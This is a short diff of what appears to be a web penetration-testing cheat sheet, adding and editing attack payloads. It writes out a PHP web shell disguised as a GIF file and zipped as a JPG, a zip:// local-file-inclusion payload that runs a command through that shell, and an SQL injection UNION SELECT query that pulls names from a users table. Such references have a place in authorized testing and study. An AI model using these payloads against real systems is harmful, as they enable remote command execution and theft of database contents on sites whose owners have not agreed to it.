@@ -565,7 +565,7 @@ echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
 
 1- echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip ok.jpg ok.php
 
-2- 
+2- zip://ok.jpg%23ok.php&cmd=id
 
 /codes/lfi/ok.jpg
 
@@ -599,7 +599,7 @@ https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
 
 #### Query default:
 
-'UNION SELECT 1, name,3,4 from users; -- -
+'UNION SELECT 1,name,3,4 from users; -- -
 
 #### Add comment /* */ for space bypass
 
